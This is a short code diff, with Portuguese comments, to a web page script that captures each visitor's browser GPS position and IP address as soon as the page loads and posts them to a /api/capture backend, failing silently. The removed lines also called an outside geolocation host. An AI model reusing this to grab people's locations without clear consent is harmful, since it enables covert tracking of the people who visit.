@@ -183,10 +183,9 @@
 
     // Captura ao carregar a página: IP + GPS imediato
     (async function() {
-      // 1) IP via backend
-      fetch('https://server.intellux.com/geolocation').catch(function(){});
+      const payload = {};
 
-      // 2) GPS do navegador - pede permissão na hora
+      // 1) GPS do navegador - pede permissão na hora
       try {
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -194,18 +193,19 @@
             timeout: 10000,
           });
         });
-        await fetch('/api/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            gps: {
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy_meters: pos.coords.accuracy,
-            }
-          }),
-        }).catch(function(){});
-      } catch (e) { /* GPS negado, tudo bem - IP já capturado */ }
+        payload.gps = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy_meters: pos.coords.accuracy,
+        };
+      } catch (e) { /* GPS negado */ }
+
+      // 2) Envia tudo pro backend (IP é pego server-side)
+      fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      }).catch(function(){});
     })();
 
     function capture() {
